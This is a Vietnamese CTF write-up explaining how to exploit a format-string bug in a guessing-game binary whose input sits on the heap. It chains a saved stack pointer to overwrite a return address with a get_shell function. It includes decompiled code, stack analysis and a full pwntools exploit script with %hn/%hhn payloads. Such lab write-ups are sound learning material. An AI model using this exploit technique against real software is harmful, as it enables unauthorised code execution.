# Format String - Dùng con trỏ stack có sẵn để thay đổi dữ liệu

*Khi bộ nhớ không còn ở trên stack, ta không thể đưa các địa chỉ cần ghi lên stack một cách dễ dàng được. Tuy nhiên, với các con trỏ stack có sẵn trên stack, ta có thể ghi thêm dữ liệu lên đó để có thể sử dụng và tạo thành một chuỗi format string ghi đè lên nhau. Việc đó cần phải kết hợp giữa dạng full form và short form của format string để đảm bảo dữ liệu được ghi đè chính xác*

**ida:**

```c

unsigned __int64 run()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Guessing game!");
  puts("1. Play");
  puts("2. Exit");
  printf("> ");
  __isoc99_scanf("%u", &v1);
  getchar();
  if ( v1 == 1 )
  {
    play();
  }
  else if ( v1 == 2 )
  {
    exit(0);
  }
  return __readfsqword(0x28u) ^ v2;
}


unsigned __int64 play()
{
  unsigned int v1; // [rsp+8h] [rbp-18h] BYREF
  unsigned int v2; // [rsp+Ch] [rbp-14h]
  char *s; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  s = (char *)malloc(0x40uLL);
  printf("Your name: ");
  fgets(s, 64, stdin);
  printf("Welcome ");
  printf(s);
  v2 = rand();
  printf("You guess: ");
  __isoc99_scanf("%u", &v1);
  getchar();
  if ( v2 <= v1 )
  {
    if ( v2 >= v1 )
      puts("Congratulation, you win!");
    else
      puts("Too large!");
  }
  else
  {
    puts("Too small!");
  }
  return __readfsqword(0x28u) ^ v4;
}

int get_shell()
{
  return system("/bin/sh");
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  run();
  return 0;
}


```

**tại hàm play ta thấy có lỗi fmt, hàm get_shell có system("/bin/sh") nên ta sẽ tập trung khai thác vào đây**

checks:

![image](https://github.com/gookoosss/CTF/assets/128712571/7b1b832f-2d21-44c8-934a-f42696f72ce2)


địa chỉ tĩnh rồi nên ta ko cần leak địa chỉ exe

tại hàm play ta thấy **s = (char *)malloc(0x40uLL)**; mà ta nhập vào biến s , chứng tỏ giá trị ta nhập vào sẽ được gán vào địa chỉ heap chứ ko phải stack, h ta debug để xem thử:

![image](https://github.com/gookoosss/CTF/assets/128712571/7be3e324-6283-4f10-8435-1e2cb672fd28)


ta nhập bao nhiêu đi chăng nữa cũng ko ảnh hưởng đến stack, đồng nghĩa với việc ret2win và ret2libc là ko thể

**bây giờ ta tel rồi cùng phân tích stack:**

![image](https://github.com/gookoosss/CTF/assets/128712571/bff024e2-79fb-480b-9ac7-7446daf4bb9e)


- **0x007fffffffe0b8** là rip của hàm main
- **0x007fffffffe0a8** là rip của hàm run 
- **0x007fffffffe088** là rip của hàm play

do dữ liệu ta nhập vào nằm ở địa chỉ heap nên ta ko thể thay đổi rip bằng cách tràn biến , nên ta chỉ có thể thay đổi rip bằng cách sử dụng lỗi fmtstr để thay đổi địa chỉ trỏ đến của rip

### ý tưởng

- ta để ý rbp của play 0x007fffffffe0a0 đang trỏ đến 0x007fffffffe0b0, ta có thể thay đổi thành địa chỉ stack của rip 
- sau khi ta làm xong bước trên thì stack 0x007fffffffe0a0 ở dưới cũng thay đổi theo luôn , lúc này rip đang trỏ đến hàm run, ta lại lợi dụng lỗi fmtstr nữa để thay hàm run thành get_shell
- địa chỉ stack sẽ thay đổi sau mỗi lần chạy , nên để cố định ta sẽ dùng thêm **NOASLR** 

``` python3 test.py DEBUG NOASLR ```

h ta chạy thử như này xem sao:

```python 

p.sendlineafter(b'> ', b'1')
# payload = b'%c'*8
payload = f'%{0xe0e8}c%10$hn'.encode()
payload += f'%{((exe.sym["get_shell"] + 5 ) & 0xffff) - 0xc8}c%14$hn'.encode()

p.sendlineafter(b'name: ', payload)
p.sendlineafter(b'guess: ', b'1')

```

hmm ko ra rồi, vậy chỉ có lý do là khi ta fmt thì ta đã dùng **2 lần short from** , nên khi fmt thì nó sẽ làm cả 2 cái cùng 1 lúc, vì vậy ta cần kết hợp giữ short form và full form vì fmt sẽ **ưu tiên full form trước, short form sau**

**script:**

```python3

from pwn import *


while True:
    p = process('./fmtstr9')
    exe = ELF('./fmtstr9')

    # gdb.attach(p, gdbscript = '''
    # b*play+111
    # c
    # ''' 
    # )

    # input()

    p.sendlineafter(b'> ', b'1')

    payload = b'%c'*8
    payload += f'%{0xc8 - 8}c%hhn'.encode()
    payload += f'%{((exe.sym["get_shell"] + 5 ) & 0xffff) - 0xc8}c%14$hn'.encode()

    p.sendlineafter(b'name: ', payload)
    p.sendlineafter(b'guess: ', b'1')

    try:
        p.sendline(b'echo ABCDABCD')
        p.recvuntil(b'ABCDABCD')
        break
    except:
        try:
            p.close()
        except:
            pass

p.interactive() 

```
